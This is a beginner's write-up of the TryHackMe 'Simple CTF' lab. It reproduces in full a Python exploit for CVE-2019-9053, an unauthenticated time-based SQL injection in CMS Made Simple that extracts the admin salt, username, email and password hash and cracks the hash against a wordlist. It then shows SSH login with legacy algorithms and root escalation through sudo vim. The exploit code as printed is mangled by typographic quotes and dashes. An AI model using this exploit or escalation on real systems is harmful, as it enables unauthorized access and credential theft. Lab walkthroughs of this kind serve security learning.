Tryhackme:SimpleCTF Writeup

This writeup actual on 2026/01/06
https://tryhackme.com/room/easyctf

First -Recon

<img width="765" height="606" alt="изображение" src="https://github.com/user-attachments/assets/7e1c476f-5ffc-472b-8e74-5c1fe1288ca7" />

nmap scanning

WEB Recon

<img width="1280" height="696" alt="изображение" src="https://github.com/user-attachments/assets/17e120bf-dcea-461f-9ee9-b4aae6658e26" />

this base path on ip

use the(/FUZZ/gobuster/nikto) to looking around in site use worldlist for destination detection
i am use nikto and find only /simple without /admin

<img width="1280" height="696" alt="изображение" src="https://github.com/user-attachments/assets/581d5057-5478-45cf-b45e-a9a38ead2e46" />


cms base path

<img width="1280" height="696" alt="изображение" src="https://github.com/user-attachments/assets/25d93581-2ff5-46c9-820d-760fbb22ddb0" />


admin login

then we need to use CVE:2019-9053 BUT this python2 script for my and you dont work properly i give you worked version for my python3 on kali this work

Usage : python3 46635.py -u http://10.81.170.225/simple

in RAW code looking normal for copy
___________________________________________________________
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30–03–2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019–9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option(‘-u’, ‘ — url’, action=”store”, dest=”url”, help=”Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option(‘-w’, ‘ — wordlist’, action=”store”, dest=”wordlist”, help=”Wordlist for crack admin password”)
parser.add_option(‘-c’, ‘ — crack’, action=”store_true”, dest=”cracking”, help=”Crack password with wordlist”, default=False)

options, args = parser.parse_args()
if not options.url:
 print (“[+] Specify an url target”)
 print (“[+] Example usage (no cracking password): exploit.py -u http://target-uri")
 print (“[+] Example usage (with cracking password): exploit.py -u http://target-uri — crack -w /path-wordlist”)
 print (“[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.”)
 exit()

url_vuln = options.url + ‘/moduleinterface.php?mact=News,m1_,default,0’
session = requests.Session()
dictionary = ‘1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$’
flag = True
password = “”
temp_password = “”
TIME = 1
db_name = “”
output = “”
email = “”

salt = ‘’
wordlist = “”
if options.wordlist:
 wordlist += options.wordlist

def crack_password():
 global password
 global output
 global wordlist
 global salt
 dict = open(wordlist)
 for line in dict.readlines():
 line = line.replace(“\n”, “”)
 beautify_print_try(line)
 if hashlib.md5(str(salt) + line).hexdigest() == password:
 output += “\n[+] Password cracked: “ + line
 break
 dict.close()

def beautify_print_try(value):
 global output
 print( “\033c”)
 cprint(output,’green’, attrs=[‘bold’])
 cprint(‘[*] Try: ‘ + value, ‘red’, attrs=[‘bold’])

def beautify_print():
 global output
 print (“\033c”)
 cprint(output,’green’, attrs=[‘bold’])

def dump_salt():
 global flag
 global salt
 global output
 ord_salt = “”
 ord_salt_temp = “”
 while flag:
 flag = False
 for i in range(0, len(dictionary)):
 temp_salt = salt + dictionary[i]
 ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
 beautify_print_try(temp_salt)
 payload = “a,b,1,5))+and+(select+sleep(“ + str(TIME) + “)+from+cms_siteprefs+where+sitepref_value+like+0x” + ord_salt_temp + “25+and+sitepref_name+like+0x736974656d61736b)+ — +”
 url = url_vuln + “&m1_idlist=” + payload
 start_time = time.time()
 r = session.get(url)
 elapsed_time = time.time() — start_time
 if elapsed_time >= TIME:
 flag = True
 break
 if flag:
 salt = temp_salt
 ord_salt = ord_salt_temp
 flag = True
 output += ‘\n[+] Salt for password found: ‘ + salt

def dump_password():
 global flag
 global password
 global output
 ord_password = “”
 ord_password_temp = “”
 while flag:
 flag = False
 for i in range(0, len(dictionary)):
 temp_password = password + dictionary[i]
 ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
 beautify_print_try(temp_password)
 payload = “a,b,1,5))+and+(select+sleep(“ + str(TIME) + “)+from+cms_users”
 payload += “+where+password+like+0x” + ord_password_temp + “25+and+user_id+like+0x31)+ — +”
 url = url_vuln + “&m1_idlist=” + payload
 start_time = time.time()
 r = session.get(url)
 elapsed_time = time.time() — start_time
 if elapsed_time >= TIME:
 flag = True
 break
 if flag:
 password = temp_password
 ord_password = ord_password_temp
 flag = True
 output += ‘\n[+] Password found: ‘ + password

def dump_username():
 global flag
 global db_name
 global output
 ord_db_name = “”
 ord_db_name_temp = “”
 while flag:
 flag = False
 for i in range(0, len(dictionary)):
 temp_db_name = db_name + dictionary[i]
 ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
 beautify_print_try(temp_db_name)
 payload = “a,b,1,5))+and+(select+sleep(“ + str(TIME) + “)+from+cms_users+where+username+like+0x” + ord_db_name_temp + “25+and+user_id+like+0x31)+ — +”
 url = url_vuln + “&m1_idlist=” + payload
 start_time = time.time()
 r = session.get(url)
 elapsed_time = time.time() — start_time
 if elapsed_time >= TIME:
 flag = True
 break
 if flag:
 db_name = temp_db_name
 ord_db_name = ord_db_name_temp
 output += ‘\n[+] Username found: ‘ + db_name
 flag = True

def dump_email():
 global flag
 global email
 global output
 ord_email = “”
 ord_email_temp = “”
 while flag:
 flag = False
 for i in range(0, len(dictionary)):
 temp_email = email + dictionary[i]
 ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
 beautify_print_try(temp_email)
 payload = “a,b,1,5))+and+(select+sleep(“ + str(TIME) + “)+from+cms_users+where+email+like+0x” + ord_email_temp + “25+and+user_id+like+0x31)+ — +”
 url = url_vuln + “&m1_idlist=” + payload
 start_time = time.time()
 r = session.get(url)
 elapsed_time = time.time() — start_time
 if elapsed_time >= TIME:
 flag = True
 break
 if flag:
 email = temp_email
 ord_email = ord_email_temp
 output += ‘\n[+] Email found: ‘ + email
 flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
 print (colored(“[*] Now try to crack password”))
 crack_password()

beautify_print()

___________________________________________________

<img width="497" height="101" alt="изображение" src="https://github.com/user-attachments/assets/db6d339d-a51d-4d4c-a820-25f81877fbcf" />

We found

Password.password salt.name
|email <—-dont needed

Connecting to ssh

<img width="844" height="431" alt="изображение" src="https://github.com/user-attachments/assets/572ef5b0-3558-4bee-b09e-caea1cff74dd" />

this 2 think how dont work properly for me and you because OpenSSh on server older then me and you use next comand for fix it

ssh -p 2222 \
-o KexAlgorithms=diffie-hellman-group14-sha1 \
-o HostKeyAlgorithms=ssh-rsa \
-o PubkeyAcceptedAlgorithms=ssh-rsa \
mitch@10.82.158.249

Finding Flags and Prvilage escalation

<img width="482" height="64" alt="изображение" src="https://github.com/user-attachments/assets/88c601ba-c0a9-4489-8393-bd0312f6c8c2" />

$ ls
user.txt
$ cat user.txt 

$ id
$ whoami
mitch
$ sudo -l
User mitch may run the following commands on Machine:
 (root) NOPASSWD: /usr/bin/vim

$ sudo vim

use in vim tap “:” with shift button and start texting !bash and tap Enter
We been root user

cd root
root@Machine:/root# cat root.txt
P.S
And we done machine thanks for reading this me first writeup i wrote them becouse other is so old and dont helpful
